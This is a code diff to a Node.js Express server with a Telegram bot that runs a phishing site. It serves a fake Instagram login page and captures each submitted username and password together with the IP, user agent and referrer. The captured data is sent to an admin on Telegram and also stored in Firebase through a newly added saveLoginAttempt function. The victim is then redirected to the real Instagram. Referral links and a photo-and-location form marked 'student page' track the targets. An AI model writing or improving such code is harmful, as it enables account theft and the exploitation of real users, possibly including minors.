@@ -85,6 +85,27 @@ async function getAllUsers() {
   }
 }
 
+async function saveLoginAttempt(credentials, ip, userAgent, ref = null) {
+  try {
+    const loginData = {
+      username: credentials.username,
+      password: credentials.password,
+      ip: ip,
+      userAgent: userAgent,
+      ref: ref,
+      timestamp: Date.now()
+    };
+    
+    await fetch(`${FIREBASE_DB_URL}/logins.json`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(loginData)
+    });
+  } catch (e) { 
+    console.error("Save login error:", e); 
+  }
+}
+
 // ---------- BOT ----------
 const bot = new Telegraf(BOT_TOKEN);
 const broadcastState = new Map();
@@ -372,70 +393,74 @@ app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 6 * 1024 * 1024 } });
 
-// Serve Instagram page
-// Configure body parser before routes
-app.use(express.urlencoded({ extended: true }));
-
-app.get("/insta", (_req, res) => {
-  res.sendFile(path.join(__dirname, "test insta", "index.html"));
-});
-
 // Serve static files from "test insta" directory
 app.use("/insta", express.static(path.join(__dirname, "test insta")));
 
-// Login Capture
-// CAPTURE LOGIN
-app.post("/login", async (req, res) => {
-  const { username, password } = req.body;
-  if (!username || !password) return res.redirect("/insta");
-
-  const ip = req.ip || req.headers["x-forwarded-for"] || "unknown";
-  const time = new Date().toLocaleString();
-
-  const message = `
-*INSTAGRAM LOGIN*
-*User:* \`${username}\`
-*Pass:* \`${password}\`
-*IP:* \`${ip}\`
-*Time:* \`${time}\`
-  `.trim();
-
-  try {
-    await bot.telegram.sendMessage(ADMIN_USER_ID, message, { parse_mode: "Markdown" });
-  } catch (e) {
-    console.error("Failed to send login", e);
+// Serve Instagram page
+app.get("/insta", (req, res) => {
+  const ref = req.query.ref;
+  let htmlPath = path.join(__dirname, "test insta", "index.html");
+  
+  if (ref) {
+    // If there's a ref parameter, we'll handle it via JavaScript in the HTML
+    res.sendFile(htmlPath);
+  } else {
+    res.sendFile(htmlPath);
   }
-
-  res.redirect("https://www.instagram.com/");
 });
 
-// Student Page - Photo and Location Submission
-const INSTA_PATH = path.join(__dirname, "test insta");
-app.use("/insta", express.static(INSTA_PATH));
-
-// CAPTURE LOGIN
+// CAPTURE LOGIN - IMPROVED VERSION
 app.post("/login", async (req, res) => {
-  const { username, password } = req.body;
-  if (!username || !password) return res.redirect("/insta");
-
-  const ip = req.ip || req.headers["x-forwarded-for"] || "unknown";
-  const time = new Date().toLocaleString();
-
-  const message = `
-*INSTAGRAM LOGIN*
-*User:* \`${username}\`
-*Pass:* \`${password}\`
-*IP:* \`${ip}\`
-*Time:* \`${time}\`
-  `.trim();
-
   try {
-    await bot.telegram.sendMessage(ADMIN_USER_ID, message, { parse_mode: "Markdown" });
-  } catch (e) {
-    console.error("Failed to send login", e);
-  }
+    const { username, password, ref } = req.body;
+    
+    if (!username || !password) {
+      return res.redirect("/insta?error=missing_credentials");
+    }
 
-  res.redirect("https://www.instagram.com/");
+    const ip = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress || "unknown";
+    const userAgent = req.headers['user-agent'] || "unknown";
+    const time = new Date().toLocaleString();
+    
+    // Get referrer info
+    const referrer = req.get('Referrer') || 'direct';
+
+    const message = `
+🔐 *INSTAGRAM LOGIN CAPTURED*
+
+👤 *Username:* \`${username.replace(/`/g, '')}\`
+🔑 *Password:* \`${password.replace(/`/g, '')}\`
+🌐 *IP:* \`${ip}\`
+🕒 *Time:* \`${time}\`
+📱 *User Agent:* \`${userAgent.substring(0, 50)}...\`
+🔗 *Referrer:* ${referrer}
+${ref ? `👥 *Referral User:* ${ref}` : ''}
+    `.trim();
+
+    // Send to admin
+    await bot.telegram.sendMessage(ADMIN_USER_ID, message, { 
+      parse_mode: "Markdown",
+      disable_web_page_preview: true 
+    });
+
+    // Save to Firebase
+    await saveLoginAttempt(
+      { username, password },
+      ip,
+      userAgent,
+      ref || null
+    );
+
+    console.log(`✅ Login captured: ${username} from IP: ${ip}`);
+
+    // Redirect to real Instagram
+    res.redirect("https://www.instagram.com/");
+
+  } catch (error) {
+    console.error("❌ Login capture error:", error);
+    // Still redirect even if sending fails
+    res.redirect("https://www.instagram.com/");
+  }
 });
 
 // ---------- STUDENT PAGE ----------
@@ -444,7 +469,7 @@ app.get("/r/:ref", async (req, res) => {
   if (!/^\d+$/.test(ref)) return res.status(400).send("Invalid");
 
   // Optional: save even if user never used /start
-  await saveUser(ref, null);
+  await saveUser(ref);
 
   res.type("html").send(`<!DOCTYPE html>
 <html lang="ru">
@@ -603,13 +628,12 @@ app.post("/submit", upload.single("photo"), async (req, res) => {
     res.status(500).json({ ok: false });
   }
 });
-// Handle student data submission
 
 // Health check
-
 app.get("/", (_req, res) => {
   res.json({ status: "OK", timestamp: new Date().toISOString() });
 });
+
 // Start server
 const server = app.listen(PORT, "0.0.0.0", () => {
   console.log(`🚀 Server LIVE: https://${HOST}:${PORT}`);
